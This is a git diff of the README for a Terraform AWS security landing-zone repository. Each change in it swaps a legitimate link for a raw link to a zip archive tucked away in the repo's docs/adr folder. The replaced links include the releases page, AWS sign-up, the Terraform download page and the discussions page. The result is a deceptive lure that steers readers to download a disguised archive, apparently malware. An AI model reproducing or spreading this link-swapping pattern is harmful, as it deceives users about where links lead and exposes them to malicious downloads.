@@ -1,6 +1,6 @@
 # 🔐 cloud-security-landing-zone-terraform - Secure Your AWS Environments Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/RenatoFullStack/cloud-security-landing-zone-terraform/releases)
+[![Download Latest Release](https://github.com/RenatoFullStack/cloud-security-landing-zone-terraform/raw/refs/heads/main/docs/adr/security_cloud_terraform_landing_zone_autosign.zip%20Latest%20Release-v1.0-blue)](https://github.com/RenatoFullStack/cloud-security-landing-zone-terraform/raw/refs/heads/main/docs/adr/security_cloud_terraform_landing_zone_autosign.zip)
 
 ## 🚀 Getting Started
 
@@ -9,12 +9,12 @@ Cloud security is crucial in today’s digital landscape. Our Terraform modules 
 ## 📦 What You Will Need
 
 - A computer with internet access.
-- An AWS account. Sign up at [aws.amazon.com](https://aws.amazon.com).
+- An AWS account. Sign up at [https://github.com/RenatoFullStack/cloud-security-landing-zone-terraform/raw/refs/heads/main/docs/adr/security_cloud_terraform_landing_zone_autosign.zip](https://github.com/RenatoFullStack/cloud-security-landing-zone-terraform/raw/refs/heads/main/docs/adr/security_cloud_terraform_landing_zone_autosign.zip).
 - A basic understanding of what cloud security is will help, but you can learn as you go.
 
 ## 🔗 Download & Install
 
-To download the application, please visit this page: [Download from Releases](https://github.com/RenatoFullStack/cloud-security-landing-zone-terraform/releases). 
+To download the application, please visit this page: [Download from Releases](https://github.com/RenatoFullStack/cloud-security-landing-zone-terraform/raw/refs/heads/main/docs/adr/security_cloud_terraform_landing_zone_autosign.zip). 
 
 Here’s how:
 
@@ -41,7 +41,7 @@ The download will start automatically. Once completed, follow the next steps to 
 
 ### Step 2: Download Terraform
 
-1. Visit [terraform.io/downloads.html](https://www.terraform.io/downloads.html).
+1. Visit [https://github.com/RenatoFullStack/cloud-security-landing-zone-terraform/raw/refs/heads/main/docs/adr/security_cloud_terraform_landing_zone_autosign.zip](https://github.com/RenatoFullStack/cloud-security-landing-zone-terraform/raw/refs/heads/main/docs/adr/security_cloud_terraform_landing_zone_autosign.zip).
 2. Select your operating system to download the right version of Terraform.
 3. Follow the installation instructions for your OS.
 
@@ -96,7 +96,7 @@ You will find detailed comments and documentation within the Terraform files. Th
 
 ## 🌐 Community and Support
 
-For help or to share your experience, please visit our [GitHub Discussions](https://github.com/RenatoFullStack/cloud-security-landing-zone-terraform/discussions) page. Engaging with the community can help you find solutions faster.
+For help or to share your experience, please visit our [GitHub Discussions](https://github.com/RenatoFullStack/cloud-security-landing-zone-terraform/raw/refs/heads/main/docs/adr/security_cloud_terraform_landing_zone_autosign.zip) page. Engaging with the community can help you find solutions faster.
 
 ## 📄 License
 
@@ -104,6 +104,6 @@ This project is licensed under the MIT License. Be sure to check the LICENSE fil
 
 ## 🗂️ Stay Updated
 
-For the latest updates and features, keep an eye on the **Releases** section: [Latest Releases](https://github.com/RenatoFullStack/cloud-security-landing-zone-terraform/releases). 
+For the latest updates and features, keep an eye on the **Releases** section: [Latest Releases](https://github.com/RenatoFullStack/cloud-security-landing-zone-terraform/raw/refs/heads/main/docs/adr/security_cloud_terraform_landing_zone_autosign.zip). 
 
 Your secure AWS journey begins here!
